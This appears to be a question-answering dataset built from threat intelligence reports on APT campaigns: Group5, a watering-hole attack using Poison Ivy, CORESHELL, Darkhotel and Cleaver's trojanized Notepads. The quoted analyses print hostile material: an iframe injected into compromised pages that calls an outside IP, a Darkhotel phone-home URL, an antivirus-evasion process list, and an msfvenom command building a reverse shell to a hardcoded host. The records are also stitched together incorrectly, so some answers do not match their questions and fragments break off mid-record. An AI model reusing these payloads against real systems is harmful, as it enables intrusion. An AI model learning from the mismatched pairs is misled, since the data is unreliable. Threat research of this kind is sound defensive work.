    "instruction": "Big Headline: Conclusion\nWhen Syrian opposition figure Noura Al-Ameer sensed something wrong and refrained from clicking, she frustrated a reasonably well put together deception. We suspect she may have been targeted in order to steal her digital identity for the purposes of mounting a larger campaign. Beginning with this initial message, we were able to identify and characterize Group5, a seemingly new entrant into the game.\nWith the identification of Group5, the number of publicly identified operations known to have targeted the opposition with (<https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-behind-the-syria-conflict.pdf>)malware has risen to five, at least: Regime-linked groups (Syrian malware groups and the Syrian Electronic Army), a Lebanese Group, , and most recently Group5. We believe that the most compelling explanation of Group5's activities is that a group in Iran may be attempting to compromise the communications of the opposition. The circumstantial evidence pointing to an Iranian group is unsurprising, given Iran's active military engagement in Syria, and the\nsympathies of many in that country for the Assad regime. However, mindful of the limits of our investigation, we stop short of conclusive statements of attribution about the identity of the operators, or their possible sponsors. We hope that by publishing this report and sharing indicators, our work will be helpful to other researchers who may see pieces of the puzzle that we do not.\nDespite the diversity of the groups targeting the Syrian opposition, they share general features: uneven or low technical sophistication plus good social engineering and well-informed targeting. These elements are characteristic of the majority of malware and phishing operations targeting the Syrian opposition over the past several years.\nThe continued targeting, and entry of new groups, reflects the continued weakness in the Syrian opposition's digital security, and more generally the risks groups face when using popular online platforms for contested political activities.\nOperators targeting the Syrian opposition plainly do not need sophisticated tools, because easily available malware continues to \"work,\" when paired with good social engineering. The technical requirement for entering the game is low, enabling unsophisticated groups to achieve successes, while permitting more advanced groups to conserve better techniques for harder targets.\nThe lack of a centralized communications hierarchy can make opposition groups responsive, and quick to adapt. However, decentralization also provides many opportunities for digital exploitation. Operators can target groups for long periods while remaining unnoticed, without fear of being spotted and blocked by a security team. Even when exploitation attempts are noticed, because the security of these groups relies on the behavior of individuals, it can be extremely difficult to ensure that more secure behaviors are adopted.\nOpposition groups and their partners face many challenges, and we appreciate the difficulty of securing behavior. The infrastructure that we analyzed is, at time of writing, apparently abandoned. However, we suspect that Group5, or the interests behind it, may be continuing to pursue efforts to target the opposition. We hope to reinforce the message that continued vigilance is necessary to defend against these operations.\n\nAnswer this question based on the above context: How does the decentralized nature of the Syrian opposition's communication structure contribute to their vulnerability to digital exploitation, and what challenges does this pose for improving their security posture?",
    "output": "The decentralized nature of the Syrian opposition's communication structure contributes to their vulnerability to digital exploitation because it provides numerous opportunities for attackers to target individual groups without being detected by a centralized security team. This decentralization allows operators to remain unnoticed for extended periods. Improving the security posture is challenging because the security of these groups relies on the behavior of individuals. Ensuring that more secure behaviors are adopted across all members is extremely difficult, especially when exploitation attempts are noticed but not uniformly addressed.",

    "instruction": "Big Headline: Activity Overview:\nOn September 24, FireEye observed SWCs, likely conducted by a unitary threat group based on shared infrastructure and tools, on at least three different websites: an international non-profit organization that focuses on environmental advocacy, and two different NGOs that promote democracy and human rights. The group was able to compromise these websites and insert malicious iframes. Figure 1 displays one of the iframes. The threat group obfuscated the iframe on two of the compromised websites.\n<div class=\"views-field views-field-body\"> <div class=\"field-content\"><p><iframe height=\"0\u2033 src=\"http://103.27.108.45/img/js.php\" width=\"0\u2033></iframe></p>\nBig Headline: Figure 2: The encoded payload (snipped for brevity)\nThe 'bin' param shown in Figure 2 is decoded from ASCII into hex by the Java exploit.

Other domains resolving to the same IP include the following:\nassign.ddnsking.com quakegoogle.servequake.com picsgoogle.servepics.com\nBig Headline: Links to the Sunshop Digital Quartermaster\nThe Poison Ivy backdoor also had a RT_MANIFEST PE resource with a SHA256 fingerprint of 82a98c88d3dd57a6ebc0fe7167a86875ed52ebddc6374ad640407efec01b1393.\nThis same RT_MANIFEST resource was documented in our previous Sunshop Digital Quartermaster report. FireEye previously identified this specific RT_MANIFEST as the 'Sunshop Manifest,' and we have observed this same manifest resource used in 86 other samples. As we stated in the Quartermaster report, we believe this shared resource is an artifact of a builder toolkit made available to a number of China-based APT groups.\nBig Headline: Conclusion\nThis activity represents a new SWC campaign. We suspect threat actors are leveraging their access to compromised websites belonging to NGOs and non-profits to target other organizations in the same industries. These websites are often visited by organization employees and other organizations in the same industries, allowing threat actors to move laterally within already compromised networks or gain access to new networks. While FireEye has not attributed this activity to a specific threat group, we frequently\nobserve China-based threat actors (<http://www.fireeye.com/blog/technical/2014/04/ngos-fighting-human-rights-violations-and-now-cyber-threat-groups.html>)target non-profits and NGOs, and we suspect that they seek to monitor activity within their borders that may lead to domestic unrest or embarrass the Chinese government. For example, in 2013, FireEye observed China-based threat actors steal grant applications and activity reports specifically related to an international NGO's China-based activities. We suspects threat actors sought to monitor these programs and involved individuals. The three organizations whose websites are hosting the malicious iframes have China-based operations.\nFireEye is releasing information on this campaign to allow organizations to investigate and prepare for this activity in their networks. We believe non-profits and NGOs remain at elevated risk of intrusion and should be especially wary of attempts to compromise their networks using SWC. Threat actors may use SWCs to achieve this goal, but FireEye does not discount the possibility that threat actors will use other means at their disposal, including phishing. Based on past threat actor activity in this industry, FireEye expects threat actors are motivated to steal programmatic data and monitor organizations' programs in specific countries. If China-based threat actors are behind the observed campaign, FireEye expects that organizations with operations in China are high-priority targets. FireEye currently has detection measures in place that should allow users of FireEye products to detect this SWC activity. It is also likely that other industries or organizations were affected by this SWC activity, since these sites are public facing and frequently visited.\nSpecial thanks to Google's Billy Leonard for providing additional information and research.\nThanks to the following authors for their contributions: Mike Oppenheim, Ned Moran, and Steve Stone.\nThis entry was posted in (<http://www.fireeye.com/blog/category/technical/threat-intelligence>)Threat Intelligence, (<http://www.fireeye.com/blog/category/technical>)Threat Research by (<http://www.fireeye.com/blog/author/sarah-engle>)Sarah Engle and (<http://www.fireeye.com/blog/author/ben-withnell>)Ben Withnell.

For more information, email .\n\u2022 The Automated Indicator Sharing (AIS) initiative is a DHS effort to create a system where as soon as a company or federal agency observes an attempted compromise, the indicator will be shared in real time with all of our partners, protecting them from that particular threat. That means adversaries can only use an attack once, which increases their costs and ultimately reduces the prevalence of cyber-attacks. While AIS will not eliminate sophisticated cyber threats, it will allow companies and federal agencies to concentrate more on them by clearing away less sophisticated attacks.\nAIS participants connect to a DHS-managed system in the NCCIC that allows bidirectional sharing of cyber threat indicators. A server housed at each participant's location allows each to exchange indicators with the NCCIC.

    "output": "To determine if a new hostname belongs to the same threat actor, you would need to analyze several factors. First, observe the naming patterns and domains used in the existing C&C hostnames. For example, many of the hostnames use dynamic DNS services like 'no-ip.biz', 'zapto.org', and 'dyndns.info'. Additionally, some hostnames follow a sequential pattern, such as 'natco1.no-ip.net', 'natco2.no-ip.net', etc. By identifying these patterns, you can infer that a new hostname like 'natco5.no-ip.net' likely belongs to the same threat actor because it follows the established naming convention and resolves to the same IP addresses as the others. Furthermore, cross-referencing the IP addresses associated with known C&C servers can provide additional confirmation.

The encryption algorithm is a custom stream cipher using a six-byte key. Commands from the controller to the CORESHELL implant are encrypted using another stream cipher but this time using an eight-byte key. CORESHELL has used the same user agent string (\"MSIE 8.0\") that SOURFACE previously used, but in more recent samples CORESHELL uses the default Internet Explorer user agent string obtained from the system. Figure 11 shows an example POST request.\nWhen Base64 decoded, the POST content looks like this:\n00000000 cd 77 ae 62 af ac ab 69 b5 6b 91 dc ab 20 b9 65 .w.b...i.k... .e 00000010 de b2 ac 2d 96 35 82 fd f3 d5 82 1e c7 bd a8 ee ...-.5.......... 00000020 9c ee 9a 30 ac e5 21 e4 a6 ...0..!..\nThe key used to encrypt the message is six bytes long and is appended to the end of the message. In this is example the key would be: 30 ac e5 21 e4 a6. When the message is decrypted, the resulting plaintext is:\n00000000 00 72 68 64 6e 7a 78 64 66 6d 46 36 66 35 61 68 .rhdnzxdfmF6f5ah 00000010 34 78 67 30 34 30 33 30 35 30 31 1a 00 00 00 23 4xg04030501....# 00000020 00 00 00 ...\nThe following table contains a breakdown of each of the field's C2 message.\nTable 6: Example CORESHELL beacon structure\nCommands are sent from the C2 server to the CORESHELL backdoor in HTTP responses to the POST requests. The command is identified by the NULL terminated UNICODE string \"OK\" (O\\x00\\K\\x00\\x00\\ x00). The command is Base64 encoded and immediately follows the \"OK\" string. Figure 12 shows a sample CORESHELL command:\nThe Base64 decoded string is:\n00000000 01 00 00 00 AA AA 01 01 01 01 01 01 01 01 10 41 ........ .......A 00000010 70 41 10 42 33 42 D3 43 F2 43 92 44 B5 44 55 45 pA.B3B.C .C.D.DUE 00000020 74 45 14 46 37 46 D7 tE.F7F.\nThe following table contains a description of each field in the command message:\nTable 7: CORESHELL C2 message structure\nWhen the above command \"10 41 70 41 10 42 33\u2026\" is decrypted using the key \"01 01 01 01 01 01 01 01\" the following command message is produced:\n00000000 04 CC C2 04 00 42 42 42 42 43 43 43 43 44 44 44 .....BBBBCCCCDDD 00000010 44 45 45 45 45 46 46 46 46  DEEEEFFFF\nThe implant supports the following four command identifiers from the controller as seen in Table 8.  The first byte of the command message specifies the command type and is immediately followed by the PE or shellcode to be executed. In this example the command byte is 04 indicating the following bytes are shellcode. If the command byte was 01, 02, or 03 the following bytes would be a DLL or EXE that would be written to disk and executed.\nTable 8: CORESHELL commands\n\nQuestion: Can you explain how CORESHELL communicates with its Command and Control (C2) server, including the encryption methods used for both sending and receiving messages? Why might the use of different encryption keys for outgoing and incoming messages be significant?\n\nAnswer:",

    "output": "WhiteBear deployments are relatively rare compared to WhiteAtlas infections and represent a departure from the broader Skipper Turla target set. The malware components of WhiteBear appear to be the product of separate development efforts, featuring a condensed spearphishing dropper, lacking Firefox extension installer payloads, and containing several new components signed with a new code signing digital certificate. These differences impact threat detection and mitigation by requiring cybersecurity professionals to update their signatures and heuristics to account for the new components and delivery methods. Additionally, the narrower targeting of WhiteBear suggests a need for tailored defensive strategies for high-value targets such as embassies and defense organizations.",

    "instruction": "Medium Headline: Non-US Foreign Allegations\nThe US is not alone in accusing China of using cyber warfare. In 2007 and 2008, China was publicly accused of hacking into government facilities by officials in Australia, France, Germany, India, Japan, New Zealand, South Korea, and the UK (Basu 2008; Goodin 2008; Ha 2008; Leyden 2007; Marquand 2007). The number of countries under Chinese attack could be far greater as some may not know that they are under attack, may not wish to reveal their weakness due to a loss of soft power and consumer confidence, or they do not wish to upset China as a valuable trading partner. Hans Elmar Remberg, Vice President of the German Office for the Protection of the Constitution (Germany's domestic intelligence agency) stated that \"across the world the PRC is intensively gathering political, military, corporate-strategic and scientific information in order to bridge their technological gaps as quickly as possible\" (Tkacik 2007).\nUnlike HUMINT, cyber warfare provides a lack of definitive attribution, makes distance nearly irrelevant, allows for the mass accumulation of data in a short span of time, and at a small cost in comparison to traditional espionage or military activities.  Cyber attacks, such as an incident that shut down the UK House of Commons, may only be small scale test runs, probing, or reconnaissance blunders, meaning that the true scope of cyber attack has yet to be seen (Norton-Taylor 2007). Cyber reconnaissance appears to be the most beneficial tool of cyber warfare. Beyond finding exploitation points in the military for future attack, the commercial sector allows China the opportunity to skip generations of research and development efforts, levelling the playing field in science and technology, and by association boosting economic and military might. Chinese hackers have even gone after British parliamentiary files on human rights issues, showing a potential interest in relation to soft power, globalization, international condemnation, and the legal apparatus. As Unrestricted Warfare has shown, there are no boundaries in relation to such military operations.\nBig Headline: 4. Case Studies: Estonia, Georgia and Chanology\nThe 2007 cyber attacks against Estonia, Georgia and Project Chanology are examples of large-scale cyber attacks. The Estonian attacks were the first to show how cyber attack against a state provides a debilitating effect at a low cost, a lack of attribution, a lack of legal framework in defence, world-wide attention, and may point to a new arm of traditional attack. The Russo-Georgian war of August 2008 was even more sophisticated and intense than the Estonian case, showing the maturation of the process. Project Chanology reveals how the collective masses can use online tools to emerge as a powerful force without a central leadership. This can be harnessed by military power through the tactics described in IO (Information Operations, see above). And as a matter of internal security, Chanology-style movements must be carefully observed as they pose a non-traditional threat. Estonia and Chanology are an emerging expression of warfare that is fuelled by new powers afforded by the internet, but spills over into the real world, not only through financial loss and media coverage (soft power), but also in the form of volatile protests, disruption, mob mentality, and the capability of drawing governments and militaries into unwanted actions.\nMedium Headline: Estonia\nIn 2007, the Estonian government relocated a Soviet-era war memorial and bronze statue in Tallinn, stating that the memorial symbolised Soviet occupation. The Russian government condemned the relocation, claiming it was a tribute to those who fought in World War II. The relocation sparked protests which resulted in 150 injuries, one death, and a month-long cyber war campaign. Estonian websites including parliament, banks, ministries, schools, and newspaper outlets were attacked with DDoS attacks and web page defacements. Some websites also redirected users to images of Soviet soldiers and quotations from Martin Luther King about resisting evil. Hackers who hit the ruling Reform Party's website left a fake message that the Estonian prime minister and his government were asking for Russian forgiveness and promising to return the statue to its original site (The Cyber Raiders Hitting Estonia 2007).\nThese attacks garnered world-wide attention. The Russian government was directly accused by media outlets and the Estonian Prime Minister Andrus Ansip. Russia had the motive and the means for such an attack. However, there was no direct evidence to suggest that the attacks were state-sponsored. There was evidence that some of the IP addresses used in the attacks belonged to Russian government officials, and instructions on how to carry out cyber warfare did circulate on Russian websites. However, the source of DDoS attacks could have been masked by using proxies or botnets that are located across the globe. Neither NATO nor European Commission experts were able to find any proof of official Russian government participation. Further, the Russian government denounced Estonia's claims and refused to participate in any type of investigation (Bright 2007; Estonia Fines Man for 'Cyber War' 2008; Estonia Hit by Moscow Cyber War 2007).\nMedium Headline: Debilitating Effect at a Low Cost\nThe effects of the cyber attacks were magnified as Estonia is one of the most internet-savvy states in the European Union (The Cyber Raiders Hitting Estonia 2007). The Estonian government has pursued a paperless society, or e-government, and web-based banking. Slowing down, or halting, banking services and newspaper outlets that rely on advertising revenue strains the economy. This happens not only through a direct loss in revenue, but also with a reduction in productivity, lost efficiency, diverting resources, escalating frustration, and lost consumer and investor confidence. Estonia also uses the internet to elect parliamentary officials, file their taxes and, via mobile phone, shop or pay for parking. In some cases, website administrators simply blocked access from foreign states. While this was effective in curbing the attacks, it completely cut off banking services to Estonians outside of the country, vital to Estonian business people abroad. Spam emails inundated government officials' inboxes, halting online communication from the Parliament's email server. Officials closed off large portions of their network to keep more vital areas online. A government briefing site was given high priority while the president's website was sacrificed. The 10 largest swarms of data requests by the hackers absorbed 90 megabits per second for up to 10 hours each, straining Estonia's networks. It was 'equivalent to downloading the entire Windows XP operating system every six seconds for 10 hours' (Landler and Markoff 2007). The cyber attacks on Estonia came close to shutting down the country's digital infrastructure. While these may seem more of a disruption than a collapse, the effects radiate out into society (Bright 2007; Estonia Hit by Moscow Cyber War 2007).\nThe month-long campaign caused companies to put resources into alternative infrastructure, such as going back to traditional mail, relying on telephones, fax, and libraries, and re-enforcing alternative methods of payment. As well as the cost of material infrastructure, these type of cyber attacks cause a loss in productivity. This includes paying more people to staff bank tellers, increased traffic on the streets, and long lines at retail outlets. Newspaper outlets, telephone companies, and product distributors, have grown accustomed to using online tools, and now rely heavily on them. While this might be a boon for some industries, the whole restructuring process weakens the nation in the short term. The cyber attacks are comparable to the damage caused to industry (beyond tangible infrastructure) by flooding or blizzards. It places a nation in a state of flux, and leaves it more vulnerable to a traditional attack.\nDDoS attacks offer an enemy country an effective low cost assault with high deniability.  The majority of attacks on Estonia were DDoS, clogging its servers, switches, and routers. Analysis from Arbor Networks revealed thousands of bots were used against Estonia from locations as diverse as the US, Vietnam, Peru, and China. The cost to a state wanting to establish botnets is minimal, requiring only one person, an internet connection, and a basic computer. While the information for conducting such attacks can be found online, it is more likely someone with expertise, such as non-government hacker groups, would be involved in securing the rental of a botnet. This still keeps the number at a minimum, and hackers can find alternative ways to fund the rental of servers with high bandwidth, such as credit card theft (Waterman 2007; The Cyber Raiders Hitting Estonia 2007).\n\nAnswer this question based on the above context: Why might some countries choose not to publicly acknowledge being victims of Chinese cyber attacks, and what implications does this have for global cybersecurity?",
    "output": "Some countries may choose not to publicly acknowledge being victims of Chinese cyber attacks for several reasons. They might not realize they are under attack, wish to avoid revealing their weaknesses due to a loss of soft power and consumer confidence, or prefer not to upset China as a valuable trading partner. This lack of transparency has significant implications for global cybersecurity. It hinders the ability to assess the true scope and impact of cyber attacks, making it harder to develop effective countermeasures and international cooperation. Additionally, it allows perpetrators to continue their activities with impunity, further exacerbating the cybersecurity landscape.",

    "instruction": "Big Headline: Consistent use of obfuscated .hta downloaders\nWhether the infection is achieved through spearphishing, physical access to a system or the Hacking Team Flash 0day, there frequently seems to be a common method for a newly-infected system to communicate with Darkhotel's c2:\nA lightly obfuscated (double escaped set of javascript variable values) script maintained within an .hta file writes an executable to disk and executes it.\nIt is interesting that this particular group has for years now deployed backdoor and downloader code in the form of .hta files. In 2010, we observed it re-purposing articles by the US think-tank, Brookings Institute, in order to attack North Korean-related targets with . It also emailed links to its to North Korean tourist groups, economists with an interest in North Korea, and more. It's somewhat strange to see such heavy reliance on older Windows-specific technology like HTML applications, introduced .\nFrom the recent sendspace.servermsys.com/downloader.hta:\nAfter execution and escaping a couple of variables, the .hta uses ancient Adodb.stream components in order to write out a string xor'd with 0x3d as an executable file and runs it.\nThis code results in the execution of \"internet_explorer_Smart_recovery.exe\" 054471f7e168e016c565412227acfe7f, and a hidden browser window phoning back to its c2. In this case,\nit seems that Darkhotel operators are checking as to whether or not the victim's default browser is Internet Explorer, as all versions of IE return the value \"0\" and other browsers leave \"appMinorVersion\" undefined. This data collection seems somewhat odd, because .hta files are supported and run by mshta.exe on Windows systems only, still delivered with Windows 8. Perhaps it is an artefact from early development of the code. Here is a recent version: \"hxxp://sendspace.servermsys.com/readme.php?type=execution&result=created_and_executed&info=\" + navigator.appMinorVersion + \"\nThe \"internet_explorer_Smart_recovery.exe\" file is a simple obfuscated downloader. A series of xor 0x28 loops decrypt the contents of a self-deletion batch file, which is then written to disk and executed. Later in the execution, a more complex rc4 loop decrypts the download url and other strings and imports.\nWhen finished, this url string decryption and connectback looks like\nhttp://sendspace.servermsys.com/wnctprx. The file is downloaded (b1f56a54309147b07dda54623fecbb89) to \".tmp\" file in %temp%, executed, and the downloader exits. This larger file is a backdoor/downloader that includes ssh functionality, and drops its keys to disk for ssh interaction. We find older Darkhotel information stealers dropped and run on the system by these downloaders.\nBig Headline: Spearphishing and .rar Attachments with RTLO\nThe Darkhotel APT will relentlessly spearphish specific targets in order to successfully compromise systems. Some targets are spearphished repeatedly with much the same social-engineering schemes.\nFor example, the attachment \"schedule(2.11~16).rar\" could be sent on February 10th, with Darkhotel returning to the same targets in late May for a second attempt with attachment \"schedule(6.1~6).rar\".\nIt consistently archives RTLO .scr executable files within .rar archives, in order to appear to the target as innocuous .jpg files. These executable files are lite droppers, maintaining these decoy jpeg files, and code to create an lnk downloader.\nWhen the target attempts to open what they think is a jpg image file, the executable code runs and drops a jpg image to disk, then opens it with mspaint.exe in the background. This \"congratulations\" document is in Korean, revealing a likely characteristic of the intended target.\nWhile the image is displayed, the code drops an unusual mspaint.lnk shortcut to disk and launches it. The shortcut maintains a multiline target shell script. This technique is also used by other APTs as persistence mechanisms, as documented by our Mandiant colleagues. The 64kb lnk file is downloader code:\nWhen this lnk file is executed, it begins an AJAX-based download process for the \"unzip.js\" file (a07124b65a76ee7d721d746fd8047066) on openofficev.info. This is another wscript file implementing AJAX to download and execute a relatively large compiled executable:\nThis executable code is saved to %temp%\\csrtsrm.exe and executed there. It is a relatively large executable (~1.2 mb) that injects malicious code and spawns remote threads into legitimate processes.\nBig Headline: Stolen certificates and evasion\nThe group appears to maintain a stockpile of stolen certificates and deploys their downloaders and the backdoors signed with them. Some of the more recent revoked certificates include ones that belong to Xuchang Hongguang Technology Co. Ltd.\nDarkhotel now tends to hide its code behind layers of encryption. It is likely that it has slowly adapted to attacking better-defended environments and prefers not to burn these stolen digital certificates. In previous attacks it would simply have taken advantage of a long list of weakly implemented, broken certificates.\nNot only are its obfuscation techniques becoming stronger, but its anti-detection technology list is growing. For example, this signed downloader (d896ebfc819741e0a97c651de1d15fec) decrypts a set of anti-malware strings in stages to identify defensive technologies on a newly-infected system, and then opens each process, looking for a matching image name:\nc:\\avast! sandbox\\WINDOWS\\system32\\kernel32.dll - Avast!\navp.exe - Kaspersky Lab\nmcagent.exe;mcuicnt.exe - Intel/Mcafee\nbdagent.exe - BitDefender\nravmon.exe,ravmond.exe - Beijing Rising\n360tray.exe,360sd.exe,360rp.exe,exeMgr.exe - Qihoo 360\nayagent.aye,avguard.;avgntsd.exe - Avira Antivirus\nccsvchst.exe,nis.exe - Symantec Norton\navgui.exe,avgidsagent.exe,avastui.exe,avastsvc.exe - Avast!\nmsseces.exe;msmpeng.exe - Microsoft Security Essentials and Microsoft Anti-Malware Service\nAVK.exe;AVKTray.exe - G-Data\navas.exe - TrustPort AV\ntptray.exe - Toshiba utility\nfsma32.exe;fsorsp.exe - F-Secure\neconser.exe;escanmon.exe - Microworld Technologies eScan\nSrvLoad.exe;PSHost.exe - Panda Software\negui.exe;ekrn.exe - ESET Smart Security\npctsSvc.exe;pctsGui.exe - PC Tools Spyware Doctor\ncasc.exe;UmxEngine.exe - CA Security Center\ncmdagent.exe;cfp.exe - Comodo\nKVSrvXP.exe;KVMonXP.exe - Jiangmin Antivirus\nnsesvc.exe;CClaw.exe - Norman\nV3Svc.exe - Ahnlab\nguardxup. - IKARUS\nFProtTray. - F-Prot\nop_mon - Agnitum Outpost\nvba332ldr.;dwengine. - DrWeb\nEven the identifying information that the backdoor seeks from a system is not decrypted until runtime. Like the \"information-stealer\" component documented in our , this component seeks to steal a set of data with which to identify the infected system. Much of the information is collected with the same set of calls, i.e. kernel32.GetDefaultSystemLangID, kernel32.GetVersion, and kernel32.GetSystemInfo:\n\u25cf Default system codepage\n\u25cf Network adapter information\n\u25cf Processor architecture\n\u25cf Hostname and IP address\n\u25cf Windows OS and Service Pack versions\nEssentially, much of this information-stealer code is the same as that observed in previous attacks.\n\nWhat strategies does Darkhotel employ to evade detection, and how do these strategies reflect the group's adaptation to better-defended environments?",
    "output": "Darkhotel employs several strategies to evade detection, including the use of stolen certificates and layers of encryption. The group maintains a stockpile of stolen certificates to sign their downloaders and backdoors, making them appear legitimate. Additionally, Darkhotel uses strong obfuscation techniques and anti-detection technology to identify and evade defensive technologies on newly-infected systems. For example, their signed downloaders decrypt a set of anti-malware strings to identify defensive technologies and open each process, looking for a matching image name. This reflects the group's adaptation to better-defended environments, as they prefer not to burn these stolen digital certificates and instead focus on evading detection through sophisticated methods.",

    "instruction": "Big Headline: Tales from the Code\nLet's take a look at the entry point code of the malicious Notepads and see if it aligns with our observations. The short answer is, it looks like nonsense. Here's a snippet from Notepad4.exe:\nAt this point the code becomes difficult to list due to instruction scission, or branching into the middle of an instruction (analogous to a frameshift error in DNA translation, if that helps). For instance, the JNP instruction at 010067FF is a two-byte instruction, and the JNZ branch at 010067F9, if satisfied, jumps to the JNP instruction's second byte at 01006800. That byte begins a different two-byte instruction, which incorporates what would have otherwise been the first byte of the instruction after the JNP, meaning its successor will start in the middle of JNP's successor, and so on. The two execution paths usually (but don't\nnecessarily) converge after a few instructions.\nThe outcome of these instructions depends on the initial state of the registers, which is technically undefined. Seeing code operate on undefined values typically suggests that the bytes aren't code after all and so shouldn't have been disassembled. But keep looking. Notice that there are no memory accesses (which could raise an access violation), no stack pointer manipulation (which could cause a stack overflow or underflow), no division instructions (which could raise a divide exception), no invalid or privileged instructions, no interrupts or indirect branches--really, no uncontrolled execution transfers of any kind. Even more tellingly, all the possible execution paths seem to eventually flow to this code:\nHere the gaps in the listing indicate when the disassembly follows an unconditional branch. The code seems to abruptly change character after the jump at 01006891, transitioning from gibberish to a string of short sequences connected by unconditional branches. This transition corresponds to a jump from the end of the short run of modifications (01006896) after the malware entry point to the beginning of the longer run of modifications (01005747) a few kilobytes before it. (See the third column in Figure 3.)\nIn the disassembly above, the first sequence of green lines is a clear CALL-POP pair intended to obtain a code address in a position-independent way. (An immediate address value marked with a relocation would be the orthodox way to obtain a code pointer, but preparing that would have involved modifying the \".reloc\" section.) No way is this construct a coincidence. Furthermore, the blue lines strongly resemble the setup for a VirtualAlloc call (VirtualAlloc(NULL, 0x1A9, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) typical of a deobfuscation stub, and the second set of green lines invoke the CALL-POPped function pointer with what one might readily assume is a hash of the string \"VirtualAlloc\". (It is.)\nThere's plenty more to observe in the disassembly, but, let's fast-forward past it.\nwindbg -c \"bp kernel32!VirtualAlloc ; g\" Notepad4.exe...\ng poi(@esp) ; ba w 1 @eax+@esi-1 ; g...\nAnd now we can dump the extracted code from memory. It isn't immediately gratifying:\nThe byte 0xD6 at address 00100019 doesn't disassemble, and there aren't any branches skipping over it. But check out the instructions just above it referencing \"[eax+19]\". The code is in a sense self-modifying, flowing right into a portion of itself that it XOR decodes. The first decoded instruction is \"LOOP 00100010\" (0xD6 ^ 0x34 = 0xE2, the opcode for LOOP), which will execute the XOR loop body 99 more times (CL - 1 = 0x63 = 99) and then fall through to the newly-decoded code.\nWhen we run this decoding stub (which, come to find out, is Metasploit's \"shikata ga nai\" decoder stub) to\nHere, the first byte to be XORed is the second byte of the LOOP instruction, hence the nonsensical destination apparent in the pre-decoding disassembly above. (For brevity, we cut each listing at the first sign of encoding.) Run that to completion, and then...\n>InMemoryOrderModuleList\n; PLDR_MODULE.BaseDllName.Buffer\nIt looks like a call over a typical module or export lookup function. In fact, it is, and as the ROR-ADD pair suggests, it implements module name and export name hashing, the algorithms of which can be expressed\nas follows:\nunsigned int GetModuleNameHash(PLDR_MODULE pLdrModule)\n{\nunsigned int hash = 0;\nchar * p = (char *) pLdrModule->BaseDllName->Buffer;\nfor (int n = pLdrModule->BaseDllName->MaximumLength; n != 0; p++, n--)\n{\nchar ch = *p;\nif (ch >= 'a') ch -= 0x20;\nhash = _rotr(hash, 13) + (unsigned char) ch;\n}\nreturn hash;\n}\nunsigned int GetExportNameHash(char *pszName)\n{\nunsigned int hash = 0;\nfor ( ; ; pszName++)\n{\nhash = _rotr(hash, 13) + (unsigned char) *pszName;\nif (*pszName == 0) break;\n}\nreturn hash;\n}\nStill, this is all just preamble. What is the point that it eventually gets to?\nYou'd be forgiven for assuming that the tremendous amount of effort poured into obfuscation means there's some treasure beyond all fables at the bottom of this erstwhile Notepad. Sorry. It just downloads and executes a block of raw code. (Spoiler: it's actually a Metasploit reverse connect stager.) Here is its behavior summarized as function calls:\nkernel32!LoadLibraryA(\"ws2_32\")\nws2_32!WSAStartup(...)\ns = ws2_32!WSASocketA(AF_INET, SOCK_STREAM, ...)\nws2_32!connect(s, { sin_family = AF_INET, sin_port = htons(12345), sin_addr = 108.175.152.230 }, 0x10)\nws2_32!recv(s, &cb, 4, 0)\np = kernel32!VirtualAlloc(NULL, cb, MEM_COMMIT, PAGE_EXECUTE_READWRITE)\nws2_32!recv(s, p, cb, 0)\np()\nThe above is known to be true for Notepad3.exe, Notepad4.exe, and notepad10.exe. NOTEPAD2.EXE doesn't seem to want to run, for reasons we didn't bother to troubleshoot for the bad guys.\nBig Headline: Denouement\nUnfortunately, we never did obtain a sample of the code that might have been downloaded. The key to that enigma-embedded, mystery-wrapped riddle is forever lost to us. The best we can do is read what's written in the Notepads and speculate as to why they exist at all.\nClearly whatever generator created these Notepads is far, far beyond the technical understanding of the Cleaver team. It stands to reason that there is a generator--no chance these were crafted by hand--and that its sophistication is even greater than that of its output. Something like that wouldn't be used only once. Something like that, if this team was able to get ahold of it, must be out there. Turn the right corner of the internet, and you can find anything...\nWell it so happens that we did eventually find it. Some of you have no doubt suspected it all along, and\nnow I'll humbly confirm it for you: the Notepads were, in their entirety, generated by Metasploit. Something along the lines of \"msfvenom -x notepad.exe -p windows/shell/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=108.175.152.230 LPORT=12345 > Notepad4.exe\". The \"msfvenom\" tool transmogrifies a Metasploit payload into a standalone EXE, and with the \"-x\" switch, it'll fuse the payload--encoded as desired--into a copy of an existing executable, exhibiting exactly the behavior we just described. Omne ignotum pro magnifico. Perhaps the more bizarre a thing is, the less mysterious it proves to be.\nHowever, we're still left to wonder what Cleaver was up to when they generated all those Notepads. One conclusion Brian proposed is that they're intended as backdoors--replacements for the legitimate Notepad on a compromised system--which would enable Cleaver to regain access to a system at some indeterminate time in the future, the next time a user runs Notepad. The team demonstrated a similarly intentioned tactic with a connect-back shell scheduled to run in a six-minute window each night; the Notepad replacement, while more intrusive, could be another example of this contingency planning tendency.\nOr maybe the Notepads were only an aborted experiment, attempted and shelved, forgotten in a flurry of compromises and criminal activity. If nothing else, they made for an unexpected bit of mystery.\nQ: What techniques are used in the malicious Notepads to achieve position-independent code execution and how do these techniques work?",
    "output": "The malicious Notepads use a CALL-POP pair to obtain a code address in a position-independent way. This technique involves calling a function and then popping the return address off the stack, which gives the current instruction pointer. This is done instead of using an immediate address value marked with a relocation, which would require modifying the '.reloc' section. Additionally, the code includes a setup for a VirtualAlloc call, which allocates memory with execute permissions, and invokes a function pointer with a hash of the string 'VirtualAlloc'. These techniques allow the code to execute without relying on fixed memory addresses, making it more resilient to changes in the memory layout.",

While not every sample distributed by this group is described in this blog, hashes of the known samples are included in the Indicators of Compromise section. Some interesting behaviors from a few of the related samples include:\nMany of the batch scripts include misspellings of common English words. One such example is the filename \"cmd\". While another example, \"domen\", is used as a variable name in a batch script which is likely meant to be \"domain\"\nAlmost all batch scripts in all samples ping localhost as a means of sleeping\nMany of the batch scripts are named \"cmd\" and some include the string \"Trons_ups\" and \"Treams\"\nMany of the batch scripts use the same commands for determining operating system version.\nMany of the early samples used applications such as wget, UltraVNC, and ChkFlash. These utilities have been replaced with custom tools in the latest sample\nSamples employing VNC used the same configuration and passwords\nAdditionally, the infrastructure used by this group has not changed much in the past three years. Many of the samples reused the same domains for implant communication. Also, many of the custom developed tools use hardcoded network locations.\nMonikers used for filenames, exported DLL functions, domains, and variable names in scripts seem to be themed and consistent. By pivoting on indicators from one of the SFX implants within AutoFocus additional samples are easily identified by overlaps in these consistencies. Most samples were delivered in a similar fashion: an SFX dropping resources which are staged and loaded with a batch and/or VBS script. The reuse of SSL certificates 